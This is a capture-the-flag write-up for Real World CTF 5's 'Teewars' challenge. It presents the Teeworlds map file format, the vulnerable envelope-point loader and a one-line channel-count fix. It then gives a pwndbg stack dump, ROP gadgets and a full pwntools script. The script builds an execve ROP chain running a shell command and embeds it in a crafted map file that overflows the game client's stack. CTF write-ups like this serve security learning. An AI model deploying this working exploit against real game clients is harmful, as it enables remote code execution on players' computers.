# Real World CTF 5 – Teewars

> 原文: https://www.ctfiot.com/91481.html
> ID: 91481


```
struct CDataFile {
 // header
 CDatafileHeader header;

 // index
 CDatafileItemType m_pItemTypes[header.m_NumItemTypes];
 s32 m_pItemOffsets[header.m_NumItems];
 s32 m_pDataOffsets[header.m_NumRawData];
 s32 m_pDataSizes[header.m_NumRawData];

 // items
 CDatafileItem items[header.m_NumItems];

 // (zlib deflated) data
 u8 data[header.m_DataSize] @ addressof(items) + header.m_ItemSize;
};

// file starts at byte 0
CDataFile file @ 0x00;
struct CDatafileHeader
{
 char m_aID[4]; // "DATA"
 s32 m_Version;
 s32 m_Size;
 s32 m_Swaplen;
 s32 m_NumItemTypes;
 s32 m_NumItems;
 s32 m_NumRawData;
 s32 m_ItemSize;
 s32 m_DataSize;
};
enum type_id : s16 {
 Version = 0,
 Info = 1,
 Image = 2,
 Envelope = 3,
 Group = 4,
 Layer = 5,
 Envelope_Points = 6,
};

struct CDatafileItemType
{
 type_id m_Type;
 padding[2];
 s32 m_Start;
 s32 m_Num;
};
fn show_type(auto to_show) {
 return to_show.m_Type;
};

struct CDatafileItem
{
 s16 m_ID;
 type_id m_Type;
 s32 m_Size;
 if (m_Type == type_id::
Version) {
 CMapItemVersion version [[inline]];
 }
 else if (m_Type == type_id::
Info) {
 CMapItemInfo info [[inline]];
 }
 else if (m_Type == type_id::
Image) {
 CMapItemImage image [[inline]];
 }
 else if (m_Type == type_id::
Envelope) {
 CMapItemEnvelope envelope [[inline]];
 }
 else if (m_Type == type_id::
Group) {
 CMapItemGroup group [[inline]];
 }
 else if (m_Type == type_id::
Layer) {
 CMapItemLayer layer [[inline]];
 }
 else if (m_Type == type_id::
Envelope_Points) {
 CEnvPoint points[m_Size/sizeof(CEnvPoint)] [[inline]];
 }
} [[format("show_type")]];
struct CPoint
{
 s32 x, y; // 22.10 fixed point
};

struct CColor
{
 s32 r, g, b, a;
};

struct CQuad
{
 CPoint m_aPoints[5];
 CColor m_aColors[4];
 CPoint m_aTexcoords[4];

 s32 m_PosEnv;
 s32 m_PosEnvOffset;

 s32 m_ColorEnv;
 s32 m_ColorEnvOffset;
};

struct CTile
{
 u8 m_Index;
 u8 m_Flags;
 u8 m_Skip;
 u8 m_Reserved;
};

struct CMapItemInfo
{
// enum { CURRENT_VERSION=1 };
 s32 m_Version;
 s32 m_Author;
 s32 m_MapVersion;
 s32 m_Credits;
 s32 m_License;
};

enum image_format : s32 {
 RGB = 0,
 RGBA
};

struct CMapItemImage
{
 s32 m_Version;
 s32 m_Width;
 s32 m_Height;
 s32 m_External;
 s32 m_ImageName;
 s32 m_ImageData;
 if (m_Version > 1) {
 image_format m_Format;
 }
};

struct CMapItemGroup
{
 s32 m_Version;
 s32 m_OffsetX;
 s32 m_OffsetY;
 s32 m_ParallaxX;
 s32 m_ParallaxY;

 s32 m_StartLayer;
 s32 m_NumLayers;

 if (m_Version > 1) {
 s32 m_UseClipping;
 s32 m_ClipX;
 s32 m_ClipY;
 s32 m_ClipW;
 s32 m_ClipH;

 s32 m_aName[3];
 }
};

enum tilemap_flags :
s32 {
 Tiles = 0,
 Game = 1
};

struct CMapItemLayerTilemap
{
// enum { CURRENT_VERSION=4 };

 s32 m_Version;

 s32 m_Width;
 s32 m_Height;
 tilemap_flags m_Flags;

 CColor m_Color;
 s32 m_ColorEnv;
 s32 m_ColorEnvOffset;

 s32 m_Image;
 s32 m_Data;

 s32 m_aName[3];
};

struct CMapItemLayerQuads
{
// enum { CURRENT_VERSION=2 };

 s32 m_Version;

 s32 m_NumQuads;
 s32 m_Data;
 s32 m_Image;

 s32 m_aName[3];
};

enum layer_type : s32 {
 Invalid,
 Game,
 Tiles,
 Quads
};

struct CMapItemLayer
{
 s32 m_Version;
 layer_type m_Type;
 s32 m_Flags;
 if (m_Type == layer_type::
Tiles) {
 CMapItemLayerTilemap m_Tilemap;
 }
 else if (m_Type == layer_type::
Quads) {
 CMapItemLayerQuads m_Quads;
 }
};

struct CMapItemVersion
{
 s32 m_Version;
};
s32 POINT_VERSION = 2; // track point version

struct CMapItemEnvelope
{
// enum { CURRENT_VERSION=3 };
 s32 m_Version;
 s32 m_Channels;
 s32 m_StartPoint;
 s32 m_NumPoints;
 s32 m_aName[8];
 if (m_Version != 1) { // technically this should be >1,
 // but for successfully reading the corrupted sample map
 // without parsing the offsets,
 // this change is needed to not fail
 s32 m_Synchronized;
 }
 if (m_Version < 3) {
 POINT_VERSION = 1;
 }
};
enum curve_id : s32 {
 Step = 0, // (abrupt drop at second value)
 Linear = 1, // (linear value change)
 Slow = 2, // (first slow, later much faster value change)
 Fast = 3, // (first fast, later much slower value change)
 Smooth = 4, // (slow, faster, then once more slow value change)
 Bezier = 5 // (Vanilla only, very customizable curve)
};

struct CEnvPoint
{
 s32 m_Time; // in ms
 curve_id m_Curvetype;
 s32 m_aValues[4]; // 1-4 depending on envelope (22.10 fixed point)

 if (POINT_VERSION > 1) {
 // bezier curve only
 // dx in ms and dy as 22.10 fxp
 s32 m_aInTangentdx[4];
 s32 m_aInTangentdy[4];
 s32 m_aOutTangentdx[4];
 s32 m_aOutTangentdy[4];
 }

 //bool operator<(const CEnvPoint& other) const { return m_Time < other.m_Time; }
} [[static]];
void CMapLayers::
LoadEnvPoints(const CLayers *pLayers, array<CEnvPoint>& lEnvPoints)
{
	lEnvPoints.clear();

	// get envelope points
	CEnvPoint *pPoints = 0x0;
	{
 int Start, Num;
 pLayers->Map()->GetType(MAPITEMTYPE_ENVPOINTS, &Start, &Num);

 if(!Num)
 return;

 pPoints = (CEnvPoint *)pLayers->Map()->GetItem(Start, 0, 0);
	}
// get envelopes
	int Start, Num;
	pLayers->Map()->GetType(MAPITEMTYPE_ENVELOPE, &Start, &Num);
	if(!Num)
 return;
for(int env = 0; env < Num; env++)
	{
 CMapItemEnvelope *pItem = (CMapItemEnvelope *)pLayers->Map()->GetItem(Start+env, 0, 0);
if(pItem->m_Version >= 3)
 {
 for(int i = 0; i < pItem->m_NumPoints; i++)
 lEnvPoints.add(pPoints[i + pItem->m_StartPoint]);
 }
else
 {
 // backwards compatibility
 for(int i = 0; i < pItem->m_NumPoints; i++)
 {
 // convert CEnvPoint_v1 -> CEnvPoint
 CEnvPoint_v1 *pEnvPoint_v1 = &((CEnvPoint_v1 *)pPoints)[i + pItem->m_StartPoint];
 CEnvPoint p;

 p.m_Time = pEnvPoint_v1->m_Time;
 p.m_Curvetype = pEnvPoint_v1->m_Curvetype;
for(int c = 0; c < pItem->m_Channels; c++)
 {
 p.m_aValues[c] = pEnvPoint_v1->m_aValues[c];
 p.m_aInTangentdx[c] = 0;
 p.m_aInTangentdy[c] = 0;
 p.m_aOutTangentdx[c] = 0;
 p.m_aOutTangentdy[c] = 0;
 }

 lEnvPoints.add(p);
 }
 }
	}
}
for(int c = 0; c < minimum(pItem->m_Channels, 4); c++)
pwndbg> stack 50
00:
0000│ rsp 0x7ffffffddc30 ◂— 0x0
01:
0008│ 0x7ffffffddc38 —▸ 0xa496b0 ◂— 0x100000000
02:
0010│ 0x7ffffffddc40 —▸ 0x7ffffffddc70 ◂— 0x1
03:
0018│ 0x7ffffffddc48 ◂— 0x100000000
04:
0020│ 0x7ffffffddc50 ◂— 0x0
05:
0028│ 0x7ffffffddc58 —▸ 0x77d180 ◂— 0xc00000005
06:
0030│ 0x7ffffffddc60 ◂— 0x0
07:
0038│ 0x7ffffffddc68 ◂— 0x600000006
08:
0040│ 0x7ffffffddc70 ◂— 0x1
09:
0048│ rax 0x7ffffffddc78 ◂— 'AAAAAAAA'
0a:
0050│ 0x7ffffffddc80 ◂— 0x0
... ↓ 5 skipped
10:
0080│ 0x7ffffffddcb0 —▸ 0x74cd58 —▸ 0x70616d ◂— 0x0
11:
0088│ 0x7ffffffddcb8 ◂— 0x0
12:
0090│ 0x7ffffffddcc0 —▸ 0x74cd58 —▸ 0x70616d ◂— 0x0
13:
0098│ 0x7ffffffddcc8 —▸ 0x521915 ◂— 0x657661530070616d /* 'map' */
14:
00a0│ 0x7ffffffddcd0 ◂— 0x10
15:
00a8│ 0x7ffffffddcd8 —▸ 0x55bf40 (gs_MapLayersBackGround) —▸ 0x54cef8 —▸ 0x46b8d0 (CMapLayers::~CMapLayers()) ◂— endbr64
16:
00b0│ 0x7ffffffddce0 —▸ 0x77c8d0 —▸ 0x54d820 —▸ 0x4b5f20 (CGameClient::~CGameClient()) ◂— endbr64
17:
00b8│ 0x7ffffffddce8 —▸ 0x77d180 ◂— 0xc00000005
18:
00c0│ 0x7ffffffddcf0 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
19:
00c8│ 0x7ffffffddcf8 —▸ 0x7ffffffddd80 —▸ 0x7ffff6c06a82 ◂— 0x375a5dfe52ada70b
1a:
00d0│ 0x7ffffffddd00 ◂— 0x1
1b:
00d8│ 0x7ffffffddd08 —▸ 0x46b752 (CMapLayers::
OnMapLoad()+34) ◂— mov rdi, qword ptr [rbx + 8]
1c:
00e0│ 0x7ffffffddd10 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
1d:
00e8│ 0x7ffffffddd18 ◂— 0xb /* '\x0b' */
1e:
00f0│ 0x7ffffffddd20 —▸ 0x77d180 ◂— 0xc00000005
1f:
00f8│ 0x7ffffffddd28 —▸ 0x4b5e0b (CGameClient::
OnConnected()+75) ◂— mov rdi, qword ptr [rbp + rbx*8 + 0x10]
20:
0100│ 0x7ffffffddd30 —▸ 0x7fffffffdee0 ◂— 0x100000000
21:
0108│ 0x7ffffffddd38 —▸ 0x7ffff6bfa010 —▸ 0x54bfc0 —▸ 0x43db00 (CClient::~CClient()) ◂— endbr64
22:
0110│ 0x7ffffffddd40 ◂— 0x0
23:
0118│ 0x7ffffffddd48 —▸ 0x43ba7a (CClient::
ProcessServerPacket(CNetChunk*)+1482) ◂— jmp 0x43b5c8
24:
0120│ 0x7ffffffddd50 ◂— 0x568
25:
0128│ 0x7ffffffddd58 ◂— 0x0
... ↓ 4 skipped
2a:
0150│ 0x7ffffffddd80 —▸ 0x7ffff6c06a82 ◂— 0x375a5dfe52ada70b
2b:
0158│ 0x7ffffffddd88 —▸ 0x7ffff6c06a83 ◂— 0x5375a5dfe52ada7
2c:
0160│ 0x7ffffffddd90 —▸ 0x7ffff6c06a83 ◂— 0x5375a5dfe52ada7
2d:
0168│ 0x7ffffffddd98 ◂— 0x0
... ↓ 4 skipped
0x000000000045f135 : mov qword ptr [rdi], rax ; ret
0x000000000043faf0 : pop rax ; ret
0x00000000004326e3 : pop rdi ; ret
0x00000000004bc1d4 : pop rdx ; ret
0x0000000000437fcb : pop rsi ; ret
0x0000000000465f30 : syscall
pop rax; ret
$content
pop rdi; ret
$address
mov qword ptr [rdi], rax; ret
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

elf = context.binary = ELF('./teeworlds')
rop = ROP(elf)

rop_chain = b""
argv = [b"/bin/sh", b"-c", b"cat /home/rwctf/flag"]

# concatenate arguments with terminating null bytes
flat_argv = b"\0".join(argv) + b"\0"

# choose address inside bss segment
argv_start = 0x6c0000
# write pointer
offset = 0
content_start = argv_start + (len(argv)+1)*8
qwords = []
for i in range(len(argv)):
 # calculate address
 qwords.append(p64(content_start + offset))

 # adjust offset
 offset += len(argv[i]) + 1

# append terminating null pointer
qwords.append(p64(0))
# add content of argv
for pos in range(0, len(flat_argv)+7, 8):
 qwords.append(flat_argv[pos:
pos+8].ljust(8, b"\0")) # ensure 8 bytes
destination = argv_start
for qword in qwords:
 # pop destination to rdi
 rop_chain += p64(rop.rdi.address)
 rop_chain += p64(destination)

 # pop content to rax
 rop_chain += p64(rop.rax.address)
 rop_chain += qword

 # move content to destination
 rop_chain += p64(0x45f135) # mov qword ptr [rdi], rax; ret

 # advance destination
 destination += 8
# do syscall
rop_chain += p64(rop.rdi.address)
rop_chain += p64(content_start) # argv[0]
rop_chain += p64(rop.rsi.address)
rop_chain += p64(argv_start) # argv
rop_chain += p64(rop.rdx.address)
rop_chain += p64(0) # env
rop_chain += p64(rop.rax.address)
rop_chain += p64(59) # execve
rop_chain += p64(rop.syscall.address)
# read prepared map from file
with open("maps/prepared.map", "rb") as f:
 map_content = f.read()

# write with changed parts to file
with open("maps/exploit.map", "wb") as f:
 # copy start of file
 f.write(map_content[:
0x24c])

 # adjust number of channels
 f.write(p32((len(rop_chain) + 0x90) // 4))

 # copy items until start of overflow
 f.write(map_content[0x250:
0x750+0x90])

 # overflow with ROP chain
 f.write(rop_chain)

 # copy remaining map content
 f.write(map_content[0x750+0x90+len(rop_chain):])
```
